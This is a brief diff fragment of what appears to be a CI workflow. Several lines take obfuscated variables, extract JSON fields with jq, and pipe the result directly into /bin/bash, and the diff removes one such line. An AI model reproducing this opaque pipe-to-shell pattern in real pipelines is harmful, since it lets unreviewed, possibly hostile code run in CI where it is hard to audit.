@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$riaq96" | jq -r .r61098 | /bin/bash
           echo $ftj172 | jq -r .r3525 | /bin/bash
           printf '%s' "$fn1275" | jq -r .pqnz87518 | /bin/bash
-          echo $s83 | jq -r .vcpio108 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
